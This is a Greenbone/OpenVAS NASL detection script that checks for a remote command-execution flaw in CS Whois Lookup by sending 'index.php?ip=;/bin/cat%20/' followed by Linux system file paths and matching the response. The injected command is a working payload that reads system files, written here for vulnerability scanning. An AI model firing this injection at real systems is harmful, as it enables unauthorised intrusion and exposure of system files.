if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100166" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2009-04-26 20:59:36 +0200 (Sun, 26 Apr 2009)" );
	script_bugtraq_id( 34700 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "CS Whois Lookup 'ip' Parameter Remote Command Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2009 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_require_keys( "Host/runs_unixoide" );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "CS Whois Lookup and CS DNS Lookup are prone to a remote
  command-execution vulnerability because the software fails to
  adequately sanitize user-supplied input.

  Successful attacks can compromise the affected software and possibly
  the computer." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/34700" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
x = 0;
files = traversal_files( "linux" );
for dir in nasl_make_list_unique( "/whois", "/cs-whois", "/cs-dns", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( dir, "/index.php?ip=;/bin/cat%20/" + file );
		req = http_get( item: url, port: port );
		buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!buf){
			continue;
		}
		if(egrep( pattern: pattern, string: buf )){
			if( strlen( dir ) > 0 ){
				installations[x] = dir;
			}
			else {
				installations[x] = NASLString( "/" );
			}
			x++;
		}
	}
}
if(installations){
	info = NASLString( "Vulnerable installations were found on the remote host in the following directory(s):\\n\\n" );
	for found in installations {
		info += NASLString( found, "\\n" );
	}
	security_message( port: port, data: info );
	exit( 0 );
}
exit( 99 );

